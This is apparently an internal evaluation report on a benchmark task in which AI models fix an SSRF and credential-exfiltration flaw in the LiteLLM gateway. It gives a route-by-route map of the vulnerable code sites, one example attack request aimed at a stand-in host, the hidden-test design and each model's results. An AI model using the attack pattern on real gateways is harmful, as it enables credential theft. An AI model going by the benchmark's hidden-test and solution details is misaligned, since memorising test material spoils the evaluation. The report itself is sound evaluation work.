# litellm-ds — a both-model breaker (DeepSeek fails 3/3 cleanly; MiMo fails 3/3 by timeout)

**Status of 2026-10-20. A both-model breaker, but weaker than jackson-databind-sib2 — read the two caveats below before quoting it.**

This task fails both target models on all three counted attempts, but the two sides of
the result are not equally strong, and two things must be stated up front:

1. **MiMo's three failures were timeouts, not completed low scores.** DeepSeek V4.1 Flash
   finished every attempt on its own and scored 0.0 three times; those three runs each
   have a completed, high-confidence postmortem. MiMo-V2.6-Pro never stopped on its own —
   each counted attempt was killed at the time limit (`AgentTimeoutError`) and graded on
   the code it had at that moment. Under the house rule adopted 2026-10-20 (a time-limit
   timeout counts as a model FAIL), that makes MiMo 0/3. It is a fair fail, but it is
   weaker evidence than a model that converged and stopped: we cannot say MiMo would not
   have fixed the last defect with more time. MiMo's postmortems were *prepared but not
   recorded* (no `verdict.json`), so there is no independent audit verdict on the MiMo side.
2. **DeepSeek's failure hinges on a single functional test, identically all three runs.**
   Unlike jackson (which failed ≥2 independent routes every attempt), DeepSeek here closed
   **all** the security routes and tripped exactly **one** legitimate-use test each time.
   Remove that one test and DeepSeek scores 1.0. This is a real, instruction-stated
   failure, but it is a one-point hinge, not a broad one.

Sources: the task build and validation records (`manifest.json`, `notes.md`), the
pre-trial fairness review (`FAIRNESS.md`, `fairness-run.json`), the per-run trial detail
and per-test grading for all six counted attempts, and — for DeepSeek only — the recorded
independent postmortem of each attempt. The MiMo postmortems exist only in prepared form.

## Summary

- **Result: both target models failed all 3 counted attempts (reward 0.0 each).**
  - DeepSeek V4.1 Flash: 0.0, 0.0, 0.0 — each run **finished on its own** (31, 67, 43 min
    of a 2-hour limit). Security 21/21 every run; **one** functional test failed every run.
  - MiMo-V2.6-Pro: 0.0, 0.0, 0.0 — each run **timed out** (`AgentTimeoutError`): r1 and r2
    at the 2-hour limit, r4 at a 3-hour re-run. Graded on the code at kill time.
- **The one defect that beats both models is the same one:** the connectivity-test
  (`/health/test_connection`) route must still let the operator opt-in
  (`allow_client_side_credentials`) restore credential inheritance for a caller-supplied
  endpoint. Every model that fully closed the security side then stripped that inheritance
  unconditionally, breaking `test_operator_opt_in_restores_inheritance_for_a_caller_endpoint`.
  Because reward is 0 if **any** functional test fails, full security + this one break = 0.0.
  - DeepSeek: all 3 runs = 21/21 security, this one functional break. Audited genuine-fail, high confidence.
  - MiMo: r2 and r4 reached the **same** state (21/21 security, this one break) but at timeout; r1
    timed out with 6 security routes still open **and** the same functional break.
- **The task is a real library with real and injected routes.** berriai/litellm at the
  commit before the published fix for GHSA-3cv6-jpf6-8222 / CVE-2026-84377 / PYSEC-2026-4066.
  Seven routes to one rule across the HTTP surface; the published fix covers only some.
- **Honest gap:** the derived scoreboard (`build/audit_results.py`, 2026-10-20) does **not**
  yet show this as a both-model fail. It prints DeepSeek `failed 0/3` and MiMo as
  `ungraded / timed out, re-run at 3 h / awaiting audit`. The both-model verdict here comes
  from applying the new timeout=fail rule to the three graded MiMo timeouts in
  `runs_mimo.log`; the reader has not caught up. The task's own manifest status is
  `built; gate pending`, and the latest (partial) gate re-run is a stress/flake run, not a
  clean gate.

## 1. The task

**Vulnerability — caller-chosen outbound destination with credential exfiltration (SSRF-class).**
LiteLLM is a self-hosted LLM gateway. An operator configures deployments (a client-facing
name, the upstream provider/endpoint, and that deployment's credentials). A client with an
ordinary proxy key can make the gateway send a provider request to a host **of the
client's choosing** — carrying the deployment's configured credential — by placing a URL
where the model identifier belongs in a deployment-scoped route, e.g.:

```
POST /openai/deployments/huggingface/https://example.invalid/v1/chat/completions
```

The body names a legitimate model; the URL path decides the destination.

- **Advisory / commit:** GHSA-3cv6-jpf6-8222, CVE-2026-84377, PYSEC-2026-4066, berriai/litellm.
  Pinned commit `76ffefcc1c36f4e78178ca0278d38385cafa6ec6` (direct parent of the published
  fix `473f72e6`). The published fix closes some, not all, of the routes below.
- **Track:** INJECTED, pattern **A+B** — real far sites, one real uncovered upstream route,
  plus two injected siblings of the same class.

**The rule (as given to the agent).** No caller-supplied value (a `model` or `file_id`
identifier, an `api_base`, a provider/cloud endpoint, or an observability host) may become
a URL-valued outbound destination, however the request delivers it — request body, query
parameter, URL path, or bracket-notation form field, at the top level or inside nested
settings. The operator may explicitly allowlist destination hosts, and allowlisted hosts
keep working. Credentials configured for a deployment must never follow a caller-chosen
destination. Every route that accepts a model identifier obeys this, including the
management connectivity-test route.

**Seven routes to the one rule** (none named in the instruction; no file/function/count given):

| Route | Pattern | Site | What it is |
|---|---|---|---|
| T1 path model (shared processor) | A, landing (published far site) | `common_request_processing.py:891` | URL-valued path model on chat/completions + embeddings (incl. `/engines` alias); path model overrides the body model **after** the body guard ran |
| T2 image handler | A, second implementation | `image_endpoints/endpoints.py:99` | same path-model override in a **separate** image-generation handler/module |
| T3 bracket form metadata | A, far input shape | `auth_utils.py:439` + `files_endpoints.py:376` | multipart bracket keys (`litellm_metadata[api_base]`, `metadata[langfuse_host]`) are flat at auth time, so the body bouncer sees a key name, not a destination |
| T4 health credential merge | A, second credential merge | `_health_endpoints.py:1830` | `/health/test_connection` merges the stored deployment credential under a caller destination field |
| T5 queue route | **B, real uncovered upstream** | `proxy_server.py:13096` | `/queue/chat/completions` never calls the request-data guard; present in upstream main, untouched by the published fix |
| T6 extra_body bracket | injected sibling | `files_endpoints.py:390` + `auth_utils.py:436` | the form parser is extended to the `extra_body[...]` container while the auth check still handles only the metadata prefix |
| T7 moderation path model | injected sibling | `proxy_server.py:8966,9010` | the Azure-compatible path-model block copied into a moderations handler the published fix never touches |

**Hidden tests.** 21 security test cases spread across the seven routes (each attack
destination parametrised over `https://example.invalid`, `https://attacker.example`,
`http://evil.example` so a host- or scheme-hardcode is caught) and 298 functional tests
(the coupled must-keep-working behaviours plus the pinned-tree project suites for
auth_utils, health endpoints, azure image routes and the provider-URL guard). Reward =
security pass fraction, **0 if any functional test fails**; 1.0 = solve.

**The coupled legitimate behaviour that does the damage (T4).** The connectivity-test route
must: (a) refuse a caller-chosen destination and not let the configured credential follow it,
**but** (b) when the operator has set `allow_client_side_credentials`, still let a
configured model inherit the configuration's credentials even though the request supplied
its own endpoint. A fix that strips the configured credential whenever the request carries
a destination field — without honouring the opt-in — passes all of security and breaks (b).
That is `functional/test_legit_health.py::test_operator_opt_in_restores_inheritance_for_a_caller_endpoint`.

## 2. How we know the task is fair

Build-gate validation (pre-trial, from `notes.md` and `manifest.json`):

| Check | Result |
|---|---|
| Vulnerable (nop) tree, offline container | security 0/21, functional 298/298 |
| Oracle fix, offline container | security 21/21, functional 298/298, reward 1.0 — three consecutive identical runs |
| 16 wrong-fix check patches | each behaved as declared (see Appendix); verified in local venv and, for representative patches, in the offline container |
| Published-fix-only patch | fails security (misses T5 queue, T6 extra_body, T7 moderation) |
| Over-hardening patches (`ff-reject-all-destinations`, `ff-overbroad-health`) | fail functional — i.e. the coupled legitimate behaviours are genuinely protected |

Pre-trial fairness review (`fairness-run.json`, `FAIRNESS.md`): **verdict READY.** Every
"could a correct fix fail the grader?" row was *no*; the medium-rated rows were
discoverability only (the instruction says "every route", "the allowlist", "the explicit
admin opt-in" without naming the route or flag, all of which exist in the repository). The
review additionally recorded **quality-tighten** items (parametrise all attack hosts, assert
the health route returns 2xx/4xx not 5xx, cross-product the form containers, neutralise
wording that enumerated routes). Per `notes.md`, these revisions were applied before the
counted trials, and the trial grading bears this out: the counted runs were graded against
the 21-case **parametrised** suite (host variants, `/engines`, form `fields0..4`, queue
body+query), not a single-host suite.

**Fairness caveat to record honestly.** The fairness run (timestamped after the trials, with
a `.preReset`/`.fairfixed-snapshot` pair on disk) noted that at *that* moment the live
`tasks/litellm-ds/tests/` tree looked pre-revision while the parametrised suite sat in
`.fairfixed-snapshot/`, and flagged this as a quality/leniency drift, **not** an unfairness.
It does not affect the counted trials (which used the parametrised suite), but it means the
task state on the VM is mid-reconciliation and the clean gate has not been re-finalised.

## 3. Results, attempt by attempt

Security is out of 21 cases, functional out of 298. Reward is 0 whenever functional < 298.

| Model | Attempt | Reward | Security | Functional | Finish | Wall | Left open | Broke |
|---|---|---|---|---|---|---|---|---|
| DeepSeek | r1 | 0.0 | 21/21 | 297/298 | success (self-stop) | 31 min | — | health opt-in inheritance (T4) |
| DeepSeek | r2 | 0.0 | 21/21 | 297/298 | success (self-stop) | 67 min | — | health opt-in inheritance (T4) |
| DeepSeek | r3 | 0.0 | 21/21 | 297/298 | success (self-stop) | 43 min | — | health opt-in inheritance (T4) |
| MiMo | r1 | 0.0 | 15/21 | 297/298 | **timeout** (2 h) | ~2 h | image (T2 ×2 hosts), moderation (T7 ×2), queue body+query (T5) | health opt-in inheritance (T4) |
| MiMo | r2 | 0.0 | 21/21 | 297/298 | **timeout** (2 h) | ~2 h | — | health opt-in inheritance (T4) |
| MiMo | r4 | 0.0 | 21/21 | 297/298 | **timeout** (3 h) | ~3 h | — | health opt-in inheritance (T4) |

- The **one** functional test broken in all six attempts is the same: the health opt-in
  credential-inheritance preservation (T4).
- 5 of 6 attempts (both DeepSeek, and MiMo r2/r4) had **full security** and were defeated by
  that single functional break alone.
- MiMo r1 additionally still had six security cases open at kill time (the second image
  handler, the moderation sibling, and both queue shapes).
- Two further MiMo runs exist on disk (r3, r5) but are not in the graded counted record
  (`runs_mimo.log` counts r1, r2, r4); they are treated as uncounted/re-run and not used here.

## 4. Why both models failed

### 4.1 The health opt-in inheritance (all 6 attempts — the deciding break)

Every attempt that closed the security side then broke the operator opt-in on
`/health/test_connection`. The recorded DeepSeek postmortems describe the mechanism three
different ways, all the same root cause:

- r1: in `test_model_connection` the model branches on `_request_selects_connection(...)`;
  when the request supplies `api_base` it uses request params only and drops all configured
  credentials, **with no `allow_client_side_credentials` check** — so under the opt-in the
  configured `api_key` is not inherited (`api_key=None`).
- r2: the model added an `allow_client_side_credentials` gate, but only around rejecting
  `litellm_credential_name`; the credential-inheritance clearing still runs unconditionally.
- r3: `if selects-connection: litellm_params = dict(request_params) else {**config, **request}`,
  again with no opt-in check.

The grader then hit `assert params.get('api_key') == 'sk-configured-secret'` and saw `None`.
The reference fix handles exactly this case (`allow_client_side_credentials` → return the
full config params including the key), so a correct fix passes. MiMo r2 and r4 landed in the
identical state before being killed; MiMo r1's final code had the same break plus open routes.

### 4.2 What MiMo additionally left open (r1 only)

At its 2-hour kill point MiMo r1 had not yet closed the second image-generation handler (T2),
the injected moderations sibling (T7), or the queue route in either the body or query shape
(T5) — the far/injected sites in modules the shared fix does not reach. By r2 and r4 MiMo had
closed all of these, but never converged on the health opt-in within 2 h or even 3 h.

### 4.3 What they got right

Both models fully understood and fixed the core vulnerability: 5 of 6 attempts closed all 21
security cases across all seven routes, including the real uncovered queue route and both
injected siblings. The failure is not comprehension of the attack — it is a single coupled
legitimate behaviour (the opt-in credential inheritance) that over-aggressive hardening
destroys, combined, on MiMo's side, with not converging inside the time limit.

### 4.4 Model profiles on this task

- **DeepSeek V4.1 Flash:** fast and decisive (31–67 min, 259–360 turns), self-stops. It solves
  the whole security surface, then over-hardens the health route and breaks the opt-in — the
  same way every run. A narrow, highly reproducible miss.
- **MiMo-V2.6-Pro:** does not converge in time. It eventually (r2, r4) matches DeepSeek's
  security-complete-but-opt-in-broken state, but only at or past the limit, and never signals
  completion. On the shorter r1 it still had far/injected routes open.

## 5. Evaluation setup

- Harness: Harbor with the Claude Code agent.
- Models: DeepSeek V4.1 Flash and MiMo-V2.6-Pro; up to 3 counted attempts each, early-exit on
  a solve (neither solved, so all three counted).
- Time limit: `CWE_AGENT_LIMIT_SEC` = 7200 (2 h) for DeepSeek r1–r3 and MiMo r1–r2; MiMo r4
  was a 3-hour re-run (`agent_timeout_multiplier` 1.5, limit 10800). DeepSeek finished every
  run well inside 2 h; MiMo was killed at the limit each time.
- Offline: the agent could reach only the model APIs; web tools disabled; the repository has
  no git history; the hidden tests are copied in only after the agent stops.
- Reward = security pass fraction, 0 if any functional test fails; 1.0 = solve.
- What counts (house rules): a provider/network outage cut is not counted; **a time-limit
  timeout now DOES count as a model fail** (rule adopted 2026-10-20). That rule is what makes
  MiMo's three timeouts a 0/3 fail here.
- Audit status, stated honestly:
  - **DeepSeek:** each of the 3 counted attempts has a recorded independent postmortem
    (`postmortem-20261020T0456xxZ/verdict.json`): `trustworthy: true`, `attribution:
    model-failed`, `confidence: high`, `verdict: genuine-fail`. Each checked for hidden-test
    lookup or route-around and found none (0 tool calls in the grading window, no netguard
    route-around), and confirmed the grader reached a normal assertion rather than crashing.
  - **MiMo:** postmortems were **prepared but not recorded** (the `postmortem-*` dirs hold
    `PREPARED.json` / `AUDITOR_BRIEF.md` but no `verdict.json`). The MiMo numbers above come
    from the real grader output (`verifier/results.json`, `reward.txt`) on the final code at
    kill time; there is no independent audit verdict on the MiMo side yet.

## 6. Where this sits among our tasks

- It is a both-model breaker, but of a different and narrower shape than
  jackson-databind-sib2. Jackson failed each model on ≥2 independent routes with completed
  scores and full recorded audits on both sides. litellm-ds fails:
  - DeepSeek on exactly **one** coupled functional test, reproducibly (a one-point hinge), with recorded audits; and
  - MiMo by **timeout** (no self-stop, no recorded audit), landing on the same one-point break when it did reach grading.
- The lever that works is the T4 health opt-in: a legitimate behaviour (opt-in credential
  inheritance) coupled tightly to the thing being locked down (credential exfiltration), so
  that the natural over-fix breaks it. This matches the recipe that broke jackson — a
  legitimate value coupled to each hidden one — applied to a credential/SSRF rule.
- It is weaker evidence than jackson on two axes: the MiMo side is timeouts not completed
  scores, and the DeepSeek side rests on a single test.

## 7. Questions you may ask

**Is this really a both-model breaker?** Both models score 0.0 on all three counted attempts.
DeepSeek's three are completed, self-stopped, high-confidence-audited genuine fails. MiMo's
three are time-limit timeouts, which count as fails under the 2026-10-20 rule — but they are
weaker evidence (no self-stop; audits prepared, not recorded). State it as such.

**Does the DeepSeek failure hinge on one test?** Yes — explicitly. All 21 security cases pass;
the single functional test `test_operator_opt_in_restores_inheritance_for_a_caller_endpoint`
fails, the same way, all three runs. Remove that test and DeepSeek scores 1.0. This is the
main way litellm-ds is weaker than jackson, and it should be quoted with the result.

**Is the one failing test fair?** The opt-in inheritance is stated in the instruction
("the explicit admin opt-in that lets callers supply their own connection parameters still
works"; "a configured model inherits the configuration credentials"), the reference fix
handles it, and the fairness review rated it fair (READY). The DeepSeek postmortems rate it a
genuine model fault with high confidence.

**Could a model have seen the answer?** The routes beyond the published fix (the queue route
and both injected siblings) are not covered by the public patch. The agent could not reach
the internet or the hidden tests; each DeepSeek postmortem checked the transcript and found
no lookup or route-around. (No equivalent check is recorded for MiMo.)

**Why doesn't the scoreboard show this as a both-model fail?** `build/audit_results.py`
(2026-10-20) prints DeepSeek `failed 0/3` and MiMo as `ungraded / timed out, re-run at 3 h /
awaiting audit` — it has not yet applied the new timeout=fail rule, nor consumed the MiMo
grader output. The both-model verdict here is taken from `runs_mimo.log` (three graded
`AgentTimeoutError` runs, reward 0.0) plus that rule. The task's manifest status is still
`built; gate pending`, and the most recent (partial) gate run was a stress/flake run.

## Appendix: what is in the task package

| What | Contents |
|---|---|
| Task | report (`instruction.md`), environment, reference fix (`solution/fix.patch`), 21 security + 298 functional hidden tests |
| Validation | gate records in `notes.md`; 16 wrong-fix check patches in `checks/` (e.g. `sf-published-only`, `sf-no-queue`, `sf-no-moderation`, `sf-no-extra-body-form`, `sf-example-host-only`, `sf-https-only`, `sf-health-crash-as-refusal`, over-hardening `ff-reject-all-destinations`, `ff-overbroad-health`; passing `pass-hardening`, `pass-alt`); fairness review `FAIRNESS.md` + `fairness-run.json` (READY) |
| DeepSeek attempts | per attempt: reward, per-test grading (`verifier/results.json`), final code, and a **recorded** postmortem verdict (trustworthy / model-failed / high / genuine-fail) |
| MiMo attempts | per attempt: reward and per-test grading at kill time; postmortems **prepared only** (no recorded verdict); all three counted attempts ended in `AgentTimeoutError` |

---

**One-line classification:** litellm-ds is a both-model breaker — DeepSeek 3/3 clean,
audited, one-functional-test hinge; MiMo 3/3 by timeout (2 h, 2 h, 3 h), un-audited — on a
single coupled legitimate behaviour (health-route opt-in credential inheritance) over a real
berriai/litellm SSRF/credential-exfil advisory with seven routes. Weaker than jackson; gate
not yet re-finalised; scoreboard not yet updated.
